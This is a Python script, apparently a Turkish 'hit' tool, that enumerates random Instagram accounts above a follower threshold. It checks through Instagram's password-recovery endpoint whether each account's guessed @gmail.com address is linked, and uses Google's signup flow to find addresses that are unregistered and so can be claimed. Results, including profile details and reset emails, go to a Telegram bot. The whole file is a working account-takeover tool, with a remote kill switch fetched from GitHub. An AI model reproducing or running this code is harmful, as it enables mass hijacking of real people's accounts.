

import sys
import requests
import datetime
import webbrowser
import datetime
import hmac
import hashlib
import requests
import json
import sys

import datetime
import requests
import sys




EXPIRY_URL = "https://raw.githubusercontent.com/eizon111lh-jpg/Emirrr/refs/heads/main/actv.py"

def check_expiry():
    try:
        now = datetime.datetime.now()
        


        # Sunucuya istek at
        response = requests.get(EXPIRY_URL, timeout=10)
        response.raise_for_status()

        content = response.text.strip().lower()
        

        if content == "expired":
            print("❌ kapatildi •> @besteizon")
            sys.exit(1)

        elif content == "active":
            print("✅ aktif •> @besteizon")
            return
    except Exception as e:
        print("⚠️ [error]")
        sys.exit(1)

check_expiry()

import requests
import threading
import time
import queue
from threading import Thread
from concurrent.futures import ThreadPoolExecutor
import requests
import os
import sys
import re
import json
import string
import random
import hashlib
import uuid
import time
from datetime import datetime
from threading import Thread
import requests
from requests import post as pp
from user_agent import generate_user_agent
from random import choice, randrange
from cfonts import render, say
from colorama import Fore, Style, init
import webbrowser
import threading  
init(autoreset=True)

INSTAGRAM_RECOVERY_URL = 'https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/'
IG_SIG_KEY_VERSION = 'ig_sig_key_version'
SIGNED_BODY = 'signed_body'
COOKIE_VALUE = 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj'
CONTENT_TYPE_HEADER = 'Content-Type'
COOKIE_HEADER = 'Cookie'
USER_AGENT_HEADER = 'User-Agent'
DEFAULT_USER_AGENT = ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                      'AppleWebKit/537.36 (KHTML, like Gecko) '
                      'Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0')
GOOGLE_ACCOUNTS_URL = 'https://accounts.google.com'
GOOGLE_ACCOUNTS_DOMAIN = 'accounts.google.com'
REFERRER_HEADER = 'referer'
ORIGIN_HEADER = 'origin'
AUTHORITY_HEADER = 'authority'
CONTENT_TYPE_FORM = 'application/x-www-form-urlencoded; charset=UTF-8'
CONTENT_TYPE_FORM_ALT = 'application/x-www-form-urlencoded;charset=UTF-8'

session = requests.Session()
session.headers.update({
    'User-Agent': DEFAULT_USER_AGENT,
    'Cookie': COOKIE_VALUE,
    'Content-Type': CONTENT_TYPE_FORM
})

TOKEN_FILE = 'tl.txt'
eizon_domain = '@gmail.com' 


P = '\x1b[1;97m'
B = '\x1b[1;94m'
O = '\x1b[1;96m'
Z = '\x1b[1;30m'
X = '\x1b[1;33m'
F = '\x1b[2;32m'
Z = '\x1b[1;31m'
L = '\x1b[1;95m'
C = '\x1b[2;35m'
A = '\x1b[2;39m'
P = '\x1b[38;5;231m'
J = '\x1b[38;5;208m'
J1 = '\x1b[38;5;202m'
J2 = '\x1b[38;5;203m'
J21 = '\x1b[38;5;204m'
J22 = '\x1b[38;5;209m'
F1 = '\x1b[38;5;76m'
C1 = '\x1b[38;5;120m'
P1 = '\x1b[38;5;150m'
P2 = '\x1b[38;5;190m'
E = '\033[1;31m'
Y = '\033[1;33m'
Z = '\033[1;31m' 
X = '\033[1;33m' 
Z1 = '\033[2;31m' 
F = '\033[2;32m' 
A = '\033[2;34m'
C = '\033[2;35m' 
S = '\033[2;36m'
G = '\033[1;34m' 
M = '\x1b[1;37m'
B = '\x1b[1;37m'

total_hits = 0
hits = 0
bad_insta = 0
bad_email = 0
good_ig = 0
infoinsta = {}

banner = render('{Vip}',colors=['white', 'blue'], align='center')
print(f'''
\033[1;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
                      {banner}


\033[1;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
''')

min_followers = int(input("Minimum Takipçi Sayısı; "))


ID = input("İd: ")

TOKEN = input("Token: ")



a = print(f""" 
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
1. 2019
2- 2020 
3. 2021
4. 2022
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
""")
Eizon = input(f"seçiminiz -> ")





if Eizon == '1':
	bbk = 12000000000
	id = 26000000000
elif Eizon == '2':
    bbk = 32000000000
    id = 40000000000
elif Eizon == '3':
    bbk = 45000000000
    id = 49500000000
elif Eizon == '4':
	bbk = 52000000000
	id = 57000000000     
else:
    	sys.exit(1)
    	

   	
    	



    
    
def update_stats():
    os.system('cls' if os.name == 'nt' else 'clear')
    ge = hits
    bt = bad_insta + bad_email
    be = good_ig
    status = (
        """\r{A}Hits - {M}[{ge}]{C} - Bad Em - {M}[{bt}] - {Z}Good Em - {M}[{be}]{X}"""
        .format(A=A,C=C,Z=Z, X=X, M=M, F=F, ge=ge, bt=bt, be=be)
    )
    print(status, end='', flush=True)


def Eizon():
    try:
        alphabet = 'azertyuiopmlkjhgfdsqwxcvbn'
        n1 = ''.join(choice(alphabet) for _ in range(randrange(6, 9)))
        n2 = ''.join(choice(alphabet) for _ in range(randrange(3, 9)))
        host = ''.join(choice(alphabet) for _ in range(randrange(15, 30)))
        headers = {
            'accept': '*/*',
            'accept-language': 'ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6',
            CONTENT_TYPE_HEADER: CONTENT_TYPE_FORM_ALT,
            'google-accounts-xsrf': '1',
            USER_AGENT_HEADER: str(generate_user_agent())
        }
        recovery_url = (f"{GOOGLE_ACCOUNTS_URL}/signin/v2/usernamerecovery"
                        "?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB")
        res1 = requests.get(recovery_url, headers=headers)
        tok = re.search(
            'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&',
            res1.text
        ).group(2)
        cookies = {'__Host-GAPS': host}
        headers2 = {
            AUTHORITY_HEADER: GOOGLE_ACCOUNTS_DOMAIN,
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            CONTENT_TYPE_HEADER: CONTENT_TYPE_FORM_ALT,
            'google-accounts-xsrf': '1',
            ORIGIN_HEADER: GOOGLE_ACCOUNTS_URL,
            REFERRER_HEADER: ('https://accounts.google.com/signup/v2/createaccount'
                              '?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&theme=mn'),
            USER_AGENT_HEADER: generate_user_agent()
        }
        data = {
            'f.req': f'["{tok}","{n1}","{n2}","{n1}","{n2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
            'deviceinfo': ('[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,'
                           'null,0,1,"",null,null,2,2]')
        }
        response = requests.post(f"{GOOGLE_ACCOUNTS_URL}/_/signup/validatepersonaldetails",
                                 cookies=cookies, headers=headers2, data=data)
        token_line = str(response.text).split('",null,"')[1].split('"')[0]
        host = response.cookies.get_dict()['__Host-GAPS']
        with open(TOKEN_FILE, 'w') as f:
            f.write(f"{token_line}//{host}\n")
    except Exception as e:
        print(e)
        Eizon()

Eizon()

def check_gmail(email):
    global bad_email, hits
    try:
        if '@' in email:
            email = email.split('@')[0]
        with open(TOKEN_FILE, 'r') as f:
            token_data = f.read().splitlines()[0]
        tl, host = token_data.split('//')
        cookies = {'__Host-GAPS': host}
        headers = {
            AUTHORITY_HEADER: GOOGLE_ACCOUNTS_DOMAIN,
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            CONTENT_TYPE_HEADER: CONTENT_TYPE_FORM_ALT,
            'google-accounts-xsrf': '1',
            ORIGIN_HEADER: GOOGLE_ACCOUNTS_URL,
            REFERRER_HEADER: f"https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&TL={tl}",
            USER_AGENT_HEADER: generate_user_agent()
        }
        params = {'TL': tl}
        data = (f"continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn"
                f"&f.req=%5B%22TL%3A{tl}%22%2C%22{email}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D"
                "&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false"
                "&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22"
                "%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D"
                "&gmscoreversion=undefined&flowName=GlifWebSignIn&")
        response = pp(f"{GOOGLE_ACCOUNTS_URL}/_/signup/usernameavailability",
                      params=params, cookies=cookies, headers=headers, data=data)
        if '"gf.uar",1' in response.text:
            hits += 1
            update_stats()
            full_email = email + eizon_domain
            username, domain = full_email.split('@')
            InfoAcc(username, domain)
        else:
            bad_email += 1
            update_stats()
    except Exception:
        pass

def check(email):
    global good_ig, bad_insta
    ua = generate_user_agent()
    dev = 'android-'
    device_id = dev + hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()[:16]
    uui = str(uuid.uuid4())
    headers = {
        USER_AGENT_HEADER: ua,
        COOKIE_HEADER: COOKIE_VALUE,
        CONTENT_TYPE_HEADER: CONTENT_TYPE_FORM
    }
    data = {
        SIGNED_BODY: ('0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.' +
                      json.dumps({
                          '_csrftoken': '9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
                          'adid': uui,
                          'guid': uui,
                          'device_id': device_id,
                          'query': email
                      })),
        IG_SIG_KEY_VERSION: '4'
    }
    response = requests.post(INSTAGRAM_RECOVERY_URL, headers=headers, data=data).text
    if email in response:
        if eizon_domain in email:
            check_gmail(email)
        good_ig += 1
        update_stats()
    else:
        bad_insta += 1
        update_stats()

def rest(user):
    try:
        headers = {
            'X-Pigeon-Session-Id': '50cc6861-7036-43b4-802e-fb4282799c60',
            'X-Pigeon-Rawclienttime': '1700251574.982',
            'X-IG-Connection-Speed': '-1kbps',
            'X-IG-Bandwidth-Speed-KBPS': '-1.000',
            'X-IG-Bandwidth-TotalBytes-B': '0',
            'X-IG-Bandwidth-TotalTime-MS': '0',
            'X-Bloks-Version-Id': ('c80c5fb30dfae9e273e4009f03b18280'
                                   'bb343b0862d663f31a3c63f13a9f31c0'),
            'X-IG-Connection-Type': 'WIFI',
            'X-IG-Capabilities': '3brTvw==',
            'X-IG-App-ID': '567067343352427',
            USER_AGENT_HEADER: ('Instagram 100.0.0.17.129 Android (29/10; 420dpi; '
                                '1080x2129; samsung; SM-M205F; m20lte; exynos7904; '
                                'en_GB; 161478664)'),
            'Accept-Language': 'en-GB, en-US',
            COOKIE_HEADER: COOKIE_VALUE,
            CONTENT_TYPE_HEADER: CONTENT_TYPE_FORM,
            'Accept-Encoding': 'gzip, deflate',
            'Host': 'i.instagram.com',
            'X-FB-HTTP-Engine': 'Liger',
            'Connection': 'keep-alive',
            'Content-Length': '356'
        }
        data = {
            SIGNED_BODY: ('0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.'
                          '{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj",'
                          '"adid":"0dfaf820-2748-4634-9365-c3d8c8011256",'
                          '"guid":"1f784431-2663-4db9-b624-86bd9ce1d084",'
                          '"device_id":"android-b93ddb37e983481c",'
                          '"query":"' + user + '"}'),
            IG_SIG_KEY_VERSION: '4'
        }
        response = requests.post(INSTAGRAM_RECOVERY_URL, headers=headers, data=data).json()
        eizonporno = response.get('email', 'h')
    except:
        eizonporno = 'h'
    return eizonporno




def InfoAcc(username, domain):
    global total_hits
    account_info = infoinsta.get(username, {})
    user_id = account_info.get('pk', 0)
    try:
        user_id_int = int(user_id)
    except:
        user_id_int = 0

    
    if 1 < user_id_int <= 1278889:
        reg_date = 2010
    elif 1279000 <= user_id_int <= 17750000:
        reg_date = 2011
    elif 17750001 <= user_id_int <= 279760000:
        reg_date = 2012
    elif 279760001 <= user_id_int <= 900990000:
        reg_date = 2013
    elif 900990001 <= user_id_int <= 1629010000:
        reg_date = 2014
    elif 1629010001 <= user_id_int <= 2369359761:
        reg_date = 2015
    elif 2369359762 <= user_id_int <= 4239516754:
        reg_date = 2016
    elif 4239516755 <= user_id_int <= 6345108209:
        reg_date = 2017
    elif 6345108210 <= user_id_int <= 10016232395:
        reg_date = 2018
    elif 10016232396 <= user_id_int <= 27238602159:
        reg_date = 2019
    elif 27238602160 <= user_id_int <= 43464475395:
        reg_date = 2020
    elif 43464475396 <= user_id_int <= 50289297647:
        reg_date = 2021
    elif 50289297648 <= user_id_int <= 57464707082:
        reg_date = 2022
    elif 57464707083 <= user_id_int <= 63313426938:
        reg_date = 2023
    else:
        reg_date = "2024 or 2025"

    try:
        is_business_api = account_info.get('is_business', False)
        acct_type = str(account_info.get('account_type', ''))
        is_business = bool(is_business_api) or (acct_type.upper() == 'BUSINESS')
    except Exception as e:
        is_business = False
        print(f"Business flag parse error: {e}")

    full_name = account_info.get('full_name')
    followers = account_info.get('follower_count')
    following = account_info.get('following_count')
    posts = account_info.get('media_count')
    bio = account_info.get('biography')
    meta_status = "meta aktif ✅" if followers > 99 else "aktif degil ❌"
    total_hits += 1
    info_text = f"""
𝐇𝐈𝐓 𝐀𝐂𝐂𝐎𝐔𝐍𝐓 𝐈𝐍𝐒𝐓𝐀𝐆𝐑𝐀𝐌
⋘─────━𓆩𝐄𝐈𝐙𝐎𝐍𓆪‏━─────⋙
Hit : {total_hits}
İsim : {full_name}
Kullanıcı Adı : {username}
Email :  {username}@{domain}
Takipçi :  {followers} 
Takip :  {following} 
Post : {posts} 
Tarih : {reg_date}
Bio :  {bio}
Meta : {meta_status}
Meta Bussines : {is_business}
Reset : {rest(username)}
Link : instagram.com/{username}/
⋘─────━𓆩𝐄𝐈𝐙𝐎𝐍𓆪‏━─────⋙
Py ~ @BestEizon • @EizonxTool
"""
    print(f"")

    # Telegram API ile POST gönder
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    payload = {
        'chat_id': ID,
        'text': info_text
    }
    try:
        resp = requests.post(url, data=payload, timeout=10)
        print(f"")
    except Exception as e:
        print(f"")
        
        
        
 #1: 472839102837465  
 #2: 475192837465920






def eizon_python():
    session = requests.Session()
    while True:
        data = {
            'lsd': ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
            'variables': json.dumps({
                'id': int(random.randrange(bbk, id)),
                'render_surface': 'PROFILE'
            }),
            'doc_id': '25618261841150840'
        }
        headers = {'X-FB-LSD': data['lsd']}
        try:
            response = requests.post('https://www.instagram.com/api/graphql', headers=headers, data=data)
            account = response.json().get('data', {}).get('user', {})
            username = account.get('username')
            if username:
                followers = account.get('follower_count', 0)
                if followers >= min_followers:
                    infoinsta[username] = account
                    emails = [username + eizon_domain]
                    for email in emails:
                        check(email)
        except Exception:
            pass

num_workers = 200  


with ThreadPoolExecutor(max_workers=num_workers) as executor:
    futures = [executor.submit(eizon_python) for _ in range(num_workers)]
    for future in as_completed(futures):
        pass
